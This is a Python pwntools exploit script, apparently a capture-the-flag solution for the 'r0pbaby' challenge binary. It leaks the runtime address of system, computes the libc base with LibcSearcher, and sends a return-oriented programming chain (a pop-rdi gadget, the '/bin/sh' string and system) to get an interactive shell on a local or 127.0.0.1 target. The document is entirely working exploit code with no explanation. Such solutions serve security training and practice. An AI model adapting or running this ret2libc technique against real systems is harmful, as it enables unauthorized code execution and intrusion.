from pwn import *
from LibcSearcher import *
ropbaby = ELF('./r0pbaby')
if args['REMOTE']:
    sh = remote('127.0.0.1', 7777)
else:
    sh = process('./r0pbaby')
context.word_size = 64

#context.log_level = 'debug'


def getfuncaddress(func):
    sh.recvuntil(': ')
    sh.sendline('2')
    sh.recvuntil('symbol: ')
    sh.sendline(func)
    sh.recvuntil(': ')
    addr = sh.recvuntil('\n', drop=True)
    return int(addr, 16)


def addropbuff(payload):
    sh.recvuntil(': ')
    sh.sendline('3')
    sh.recvuntil('): ')
    length = len(payload)
    sh.sendline(str(length))
    sh.sendline(payload)


rdi_ret_offset = 0x0000000000021102
system_addr = getfuncaddress('system')
libc = LibcSearcher('system', system_addr)
libc_base = system_addr - libc.dump('system')
binsh_addr = libc.dump('str_bin_sh') + libc_base
rdi_ret = rdi_ret_offset + libc_base
print hex(system_addr), hex(binsh_addr), hex(rdi_ret)
payload = flat(['b' * 8, rdi_ret, binsh_addr, system_addr])
#gdb.attach(sh)
addropbuff(payload)
sh.interactive()
